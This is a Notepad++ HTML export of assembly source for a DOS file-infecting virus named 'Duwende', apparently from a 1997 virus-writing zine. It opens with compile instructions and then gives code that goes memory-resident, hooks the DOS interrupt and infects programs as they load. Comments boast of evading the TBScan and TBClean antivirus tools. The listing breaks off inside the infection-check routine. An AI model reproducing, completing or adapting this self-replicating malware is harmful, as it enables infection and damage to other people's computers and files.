<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0"> </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; Hex-Files No. 1                                  December 1997</span><span class="sc0">
 </span><span class="sc1">;===============================================================</span><span class="sc0">
 </span><span class="sc1">;   Likhang Pilipino!   Ipinagmamalaki!   Gawa sa Pilipinas!</span><span class="sc0">
 </span><span class="sc1">;===============================================================</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;                   my program is short</span><span class="sc0">
 </span><span class="sc1">;                   short really is a dwarf</span><span class="sc0">
 </span><span class="sc1">;                   dwarf is called here duwende</span><span class="sc0">
 </span><span class="sc1">;                   therefore my program is DUWENDE</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; Virus : Duwende </span><span class="sc0">
 </span><span class="sc1">; Author: Putoksa Kawayan</span><span class="sc0">
 </span><span class="sc1">; Date  : March 15, 1997</span><span class="sc0">
 </span><span class="sc1">; Origin: Metro Manila, Philippines</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;===============================================================</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; How to compile:</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;  first. cut everything from the start of this file up to</span><span class="sc0">
 </span><span class="sc1">;  the line that says "duwende.asm starts here".</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;  next. goto end of file and cut everything starting from the </span><span class="sc0">
 </span><span class="sc1">;  line that says "duwende.asm ends here" up to the end of the file.</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;  then. save file as duwende.asm</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;  finally. you need a compiler program. tasm and masm are</span><span class="sc0">
 </span><span class="sc1">;  commercial. a86 is shareware, get a copy in internet. what</span><span class="sc0">
 </span><span class="sc1">;  compiler you have, i dont know. so choose what is best for you.</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;   tasm: (2.01)  tasm duwende.asm;</span><span class="sc0">
 </span><span class="sc1">;                 tlink duwende.obj; </span><span class="sc0">
 </span><span class="sc1">;                 exe2bin duwende.exe duwende.com</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;                 ** tlink /t aint work because of org 0 **</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;   masm: (5.00)  masm duwende.asm;</span><span class="sc0">
 </span><span class="sc1">;                 link duwende.obj;</span><span class="sc0">
 </span><span class="sc1">;                 exe2bin duwende.exe duwende.com</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;         (6.00)  ml /AT /Zm duwende.asm</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;   a86:  (4.02)  a86 duwende.asm duwende.com</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;         (2.16)  a86 duwende.asm TO duwende.com </span><span class="sc0">
 </span><span class="sc1">;               </span><span class="sc0">
 </span><span class="sc1">;                 ** requires minor code fixing. see end of listing **</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;  lastly. this is virii you know. this virii is tame and lame but </span><span class="sc0">
 </span><span class="sc1">;  makes problem. _watch_out_any_hows_ :)</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">_my_program</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_my_program</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">_my_program</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">; structure of dos dta</span><span class="sc0">
 </span><span class="sc5">dta</span><span class="sc0">     </span><span class="sc9">struc</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">_jmp1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; drive number -&gt; A=01,B=02,...</span><span class="sc0">
 </span><span class="sc5">_jmp2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;11 dup (?)     ; 11 byte search mask</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                  </span><span class="sc1">; reserved -&gt; for next search</span><span class="sc0">
 </span><span class="sc5">_attr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; attribute</span><span class="sc0">
 </span><span class="sc5">_time</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; time stamp</span><span class="sc0">
 </span><span class="sc5">_date</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; date stamp</span><span class="sc0">
 </span><span class="sc5">_len</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; length low order</span><span class="sc0">
 </span><span class="sc5">_asciiz</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; length high order</span><span class="sc0">
 </span><span class="sc5">namext</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                  </span><span class="sc1">; file name</span><span class="sc0">
 </span><span class="sc5">dta</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc5">codlen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc5">_finis</span><span class="sc4">-</span><span class="sc5">_is_me</span><span class="sc4">)+</span><span class="sc2">31</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">     </span><span class="sc1">; memory required in para</span><span class="sc0">
                                             </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">_is_me</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">                         </span><span class="sc1">; welcome to my virii </span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">; memry selfrec :&lt; :( :) :&gt;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; check: ax = dx = 0xffff</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">cbw</span><span class="sc0">                                 </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">cwd</span><span class="sc0">                                 </span><span class="sc1">; hide undocumented dos from</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;    tbscan </span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                       </span><span class="sc1">; if memry resident</span><span class="sc0">
                                             </span><span class="sc1">;    ax = 0xff00 dx = 0</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; get start offset + 3</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_01</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; not resident</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; get mcb length</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">codlen</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                      </span><span class="sc1">; release some memory</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                      </span><span class="sc1">; alocate memory</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; reset top mem</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; set mcb owner to dos</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; save start of virii</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_me_dta</span><span class="sc0">           </span><span class="sc1">; copy virii code to</span><span class="sc0">
         </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                          </span><span class="sc1">; mem top</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; save old dos int </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_off</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_is_dos</span><span class="sc0">           </span><span class="sc1">; set up own dos int</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; reset segments</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_save</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; return overwritten victim</span><span class="sc0">
 </span><span class="sc5">_02</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; code and execute victim</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; from there. this will make </span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; generic cleaner inutile</span><span class="sc0">
         </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;    esp tbclean</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">                               </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">; execute victim</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;===============================================================</span><span class="sc0">
                                             </span><span class="sc1">;&gt;                 &lt;</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Duwende'</span><span class="sc0">                   </span><span class="sc1">;&gt; *program name*  &lt;</span><span class="sc0">
                                             </span><span class="sc1">;&gt;                 &lt;</span><span class="sc0">
 </span><span class="sc1">;===============================================================</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">; my dos int handler</span><span class="sc0">
 </span><span class="sc5">_is_dos</span><span class="sc4">:</span><span class="sc6">pushf</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                      </span><span class="sc1">; only infects on </span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_05</span><span class="sc0">                         </span><span class="sc1">; program load</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; my resident id?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_04</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_03</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popf</span><span class="sc0">                                </span><span class="sc1">; execute old dos handler</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                        </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc5">_off</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc5">_seg</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_04</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; set dx = 0  al = 0</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">                                </span><span class="sc1">; resident ID</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">; my error int handle</span><span class="sc0">
 </span><span class="sc5">_is_err</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_who_me</span><span class="sc4">:</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">75h</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; no one else but me!!!!</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">71h</span><span class="sc0">                            </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6bh</span><span class="sc0">                              </span><span class="sc1">;  :)</span><span class="sc0">
         </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">63h</span><span class="sc0">                           </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">61h</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; &lt;--- this compile ok </span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">63h</span><span class="sc0">                            </span><span class="sc1">;    in tasm and masm</span><span class="sc0">
         </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">63h</span><span class="sc0">                           </span><span class="sc1">;    but not in old a86</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6eh</span><span class="sc0">                              </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_05</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; save registers used</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                      </span><span class="sc1">; save active dta</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; save victim</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_me_dta</span><span class="sc0">           </span><span class="sc1">; set virii dta</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; init pointer</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; get victim</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                      </span><span class="sc1">; dos find file gives you</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc0">                      </span><span class="sc1">; drive:attrib:size:date:time</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; also caps filename </span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">_07</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; selfrec on file :&gt;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._time</span><span class="sc0">      </span><span class="sc1">; infect check</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._date</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
